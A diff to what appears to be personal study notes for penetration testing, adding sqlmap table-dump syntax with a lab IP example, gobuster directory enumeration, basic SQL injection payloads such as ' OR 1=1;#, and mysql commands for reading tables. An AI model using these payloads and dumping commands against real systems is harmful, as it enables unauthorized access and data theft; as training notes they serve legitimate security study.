@@ -15,6 +15,7 @@ arp -g
 3. sqlmap --url <url> --tables
 4. sqlmap --url <url> -T <table_name> --columns
 5. sqlmap --url <url> --dump -D <database_name> -T <table_name>
+    1. Ex: sqlmap --url http://10.10.44.234/about/2 --dump -D site -T people
 
 # Nmap
 1. nmap -sV -O -sC -T4 <ip_addr>
@@ -54,6 +55,23 @@ SNOW.EXE It tells the CMD window that we are using the snow tool for steganograp
 input.txt The file in which you want to conceal the message within.
 
 output.txt The file in which you want the output.
+
+# gobuster:
+* gobuster dir -u <url> -w <wordlist>   -- enumerates and finds the directories
+* x : option to specify file extensions
+
+# SQL Injection:
+1.single quote (')
+2.payloads: ' OR 1=1;
+            ' OR 1=1;#
+		  
+# Mysql client
+1. Command : mysql -u <user> -h <url> -p   -- able to connect mysql running on port 3306
+* After connecting to mysql
+2.Commands
+  1. show databases;
+  2. use <database_name>;  -- the dtabase you wanna check
+  3. select * from <tablename>;
 
 # Hack an Android Device by Creating Binary Payloads using Parrot Security
 
